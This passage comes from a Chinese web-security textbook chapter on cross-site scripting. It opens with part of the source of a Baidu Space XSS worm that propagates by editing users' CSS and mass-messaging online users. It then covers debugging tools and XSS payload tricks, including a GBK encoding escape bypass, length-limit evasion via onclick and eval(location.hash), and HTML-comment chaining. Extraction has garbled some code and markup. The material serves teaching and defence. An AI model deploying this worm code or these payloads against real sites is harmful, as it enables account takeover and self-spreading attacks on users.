sendfriendmsg();
count();
hack();
}
function goteditcss() {
src="http://hi.baidu.com"+spaceid+"/modify/
spcrtempl/0";
s=getmydata(src);
re = /\/i;
r = s.match(re);
nowuse=r[2];
makeevilcss(spaceid,"http://hi.baidu.com"+spa
ceid+"/modify/spcss/"+nowuse+".css/edit"
,1);
return 0;
}
function poster(){
var request = false;
if(window.XMLHttpRequest) {
request = new XMLHttpRequest();
if(request.overrideMimeType) {
request.overrideMimeType('text/xml');
}
} else if(window.ActiveXObject) {
var versions = ['Microsoft.XMLHTTP',
'MSXML.XMLHTTP', 'Microsoft.XMLHTTP',
'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0',
'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0',
'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
for(var i=0; i500) {
evilonlinemsg="哈哈,还记得我不,加个友情链接
吧?\r\n\r\n\r\n我的地址是"+myhibaidu;
xmlDoc=new
ActiveXObject("Microsoft.XMLDOM");
xmlDoc.async=false;
xmlDoc.load("http://hi.baidu.com/sys/file/
moreonline.xml");
online=xmlDoc.documentElement;
users=online.getElementsByTagName("id");
x=Math.floor(Math.random() * (200 + 1));
eval('msgimg'+x+'=new Image();');
eval('msgimg'+x
+'.src="http://msg.baidu.com/?
ct=22&cm=MailSend&tn=bmSubmit&sn=
"+URLEncoding(users[x].text)+"&co="+URLEncodi
ng(evilonlinemsg)+"&vcodeinput=";');
}
}
攻击者想要通过XSS做坏事是很容易的，而XSS Worm则能够把这种破坏无限扩
大，这正是大型网站所特别担心的事情。
无论是MySpace蠕虫，还是百度空间的蠕虫，都是“善意”的蠕虫，它们只是在“恶
作剧”，而没有真正形成破坏。真正可怕的蠕虫，是那些在无声无息地窃取用户数据、
骗取密码的“恶意”蠕虫，这些蠕虫并不会干扰用户的正常使用，非常隐蔽。
3.2.5 调试JavaScript
要想写好XSS Payload，需要有很好的JavaScript功底，调试JavaScript是必不可少
的技能。在这里，就简单介绍几个常用的调试JavaScript的工具，以及辅助测试的工
具。
Firebug
这是最常用的脚本调试工具，前端工程师与Web Hacking必备，被喻为“居家旅行的
瑞士军刀”。
Firebug非常强大，它有好几个面板，可以查看页面的DOM节点。
Firebug的界面
调试JavaScript：在Firebug中调试JavaScript
查看HTML与CSS：在Firebug中查看HTML与CSS
毋庸置疑，Firebug是JavaScript调试的第一利器。如果要说缺点，那就是除了
Firefox外，对其他浏览器的支持并不好。
IE 8 Developer Tools
在IE 8中，为开发者内置了一个JavaScriptDebugger，可以动态调试JavaScript。
IE 8的开发者工具界面
在需要调试IE而又没有其他可用的JavaScript Debugger时，IE 8 Developer Tools
是个不错的选择。
Fiddler
Fiddler是一个本地代理服务器，需要将浏览器设置为使用本地代理服务器上网才可
使用。Fiddler会监控所有的浏览器请求，并有能力在浏览器请求中插入数据。
Fiddler支持脚本编程，一个强大的Fiddler脚本将非常有助于安全测试。
Fiddler的界面
HttpWatch
HttpWatch是一个商业软件，它以插件的形式内嵌在浏览器中。
HttpWatch的界面
HttpWatch也能够监控所有的浏览器请求，在目标网站是HTTPS时会特别有用。但
HttpWatch并不能调试JavaScript，它仅仅是一个专业的针对Web的“Sniffer”。
善用这些调试工具，在编写XSS Payload与分析浏览器安全时，会事半功倍。
3.2.6 XSS构造技巧
前文重点描述了XSS攻击的巨大威力，但是在实际环境中，XSS的利用技巧比较复
杂。本章将介绍一些常见的XSS攻击技巧，也是网站在设计安全方案时需要注意的地
方。
3.2.6.1 利用字符编码
“百度搜藏”曾经出现过一个这样的XSS漏洞。百度在一个标签中输出了一
个变量，其中转义了双引号：
var redirectUrl="\";alert(/XSS/);";
一般来说，这里是没有XSS漏洞的，因为变量处于双引号之内，系统转义了双引号
导致变量无法“escape”。
但是，百度的返回页面是GBK/GB2312编码的，因此“%c1\”这两个字符组合在一起
后，会成为一个Unicode字符。在Firefox下会认为这是一个字符，所以构造：
%c1";alert(/XSS/);//
并提交：
提交的数据包
在Firefox下得到如下效果：
在Firefox下的效果
这两个字节：“%c1\”组成了一个新的Uni-code字符，“%c1”把转义符号“\”给“吃掉
了”，从而绕过了系统的安全检查，成功实施了XSS攻击。
3.2.6.2 绕过长度限制
很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造
成的。假设下面代码存在一个XSS漏洞：
服务器端如果对输出变量“$var”做了严格的长度限制，那么攻击者可能会这样构造
XSS：
$var为： ">
希望达到的输出效果是：
" />
假设长度限制为20个字节，则这段XSS会被切割为：
$var 输出为： "> alert(/xss
连一个完整的函数都无法写完，XSS攻击可能无法成功。那此时，是不是万事大吉
了呢？答案是否定的。
攻击者可以利用事件（Event）来缩短所需要的字节数：
$var 输出为： "onclick=alert(1)//
加上空格符，刚好够20个字节，实际输出为：
当用户点击了文本框后，alert()将执行：
恶意脚本被执行
但利用“事件”能够缩短的字节数是有限的。最好的办法是把XSS Payload写到别
处，再通过简短的代码加载这段XSS Payload。
最常用的一个“藏代码”的地方，就是“loca-tion.hash”。而且根据HTTP协议，
location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下
location.hash里的内容，从而也更好地隐藏了黑客真实的意图。
$var 输出为： "
onclick="eval(location.hash.substr(1))
总共是40个字节。输出后的HTML是：
因为location.hash的第一个字符是 # ，所以必须去除第一个字符才行。此时构造出
的XSS URL为：
http://www.a.com/test.html#alert(1)
用户点击文本框时，location.hash里的代码执行了。
location.hash里的脚本被执行
location.hash本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个
长度已经足够写很长的XSS Payload了。要是地址栏的长度也不够用，还可以再使用加
载远程JS的方法，来写更多的代码。
在某些环境下，可以利用注释符绕过长度限制。
比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用
HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个
标签。
xxxxxxxxxxxxx
在第一个input框中，输入：
">
最终的效果是：
xxxxxxxxxxxxxxxxx
" />
中间的代码全部被
给注释掉了！最终效果如下：
恶意脚本被执行
而在第一个input框中，只用到了短短的6个字节！
3.2.6.3 使用标签
标签并不常用，它的作用是定义页面上的所有使用“相对路径”标签的hosting
地址。
比如，打开一张不存在的图片：
测试页面
这张图片实际上是Google的一张图片，原地址为：